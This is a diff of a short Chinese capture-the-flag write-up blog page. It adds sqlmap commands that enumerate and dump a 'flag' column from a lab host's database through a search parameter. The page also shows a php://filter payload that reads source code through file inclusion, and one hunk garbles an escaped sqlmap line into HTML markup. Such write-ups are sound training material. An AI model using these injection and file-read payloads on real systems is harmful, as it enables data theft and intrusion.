@@ -14,7 +14,7 @@
 有一串js判断丢到控制台运行
 点击报错发现DOM树
 Web2：SQLsqlmap
-Web3：可视化监控管理Dirsearch: ,"> 
+sqlmap -u &#34;http://172.3,"> 
     <meta name="author" content="H3ng"> 
     <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -62,6 +62,11 @@ Web3：可视化监控管理Dirsearch: ,">
 <p>有一串js判断丢到控制台运行</p>
 <p>点击报错发现DOM树</p>
 <h2 id="Web2：SQL"><a href="#Web2：SQL" class="headerlink" title="Web2：SQL"></a>Web2：SQL</h2><p>sqlmap</p>
+<pre><code>sqlmap -u "http://172.31.65.174/search.jsp?keyname=" --dbs 
+sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables 
+sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables -T db_news 
+sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables -T db_news --columns 
+sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables -T db_news --columns -C flag --dump</code></pre>
 <h2 id="Web3：可视化监控管理"><a href="#Web3：可视化监控管理" class="headerlink" title="Web3：可视化监控管理"></a>Web3：可视化监控管理</h2><p>Dirsearch: /index.php/login/</p>
 <p>访问发现后台index.php?page=index</p>
 <pre><code>index.php?page=php://filter/convert.base64-encode/resource=index.php</code></pre>
